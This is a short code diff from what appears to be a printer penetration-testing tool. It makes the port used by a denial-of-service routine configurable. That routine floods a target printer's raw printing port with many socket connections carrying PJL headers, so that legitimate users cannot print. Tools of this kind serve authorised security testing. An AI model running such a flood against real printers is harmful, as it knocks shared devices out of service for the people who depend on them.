@@ -2307,7 +2307,9 @@ end
         count = conv().int(arg) or 100
         
         output().warning("═" * 70)
-        output().warning(f"DoS attack: Flooding {count} connections to {self.target}:9100")
+        from utils.ports import PortConfig as _PC
+        _dos_port = _PC.resolve('raw')
+        output().warning(f"DoS attack: Flooding {count} connections to {self.target}:{_dos_port}")
         output().warning("This will make the printer unavailable to legitimate users!")
         output().warning("═" * 70)
         
@@ -2330,7 +2332,7 @@ end
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(5)
-                result = sock.connect_ex((self.target, 9100))
+                result = sock.connect_ex((self.target, _dos_port))
                 if result == 0:
                     sock.send(b"@PJL\r\n")
                     connections.append(sock)
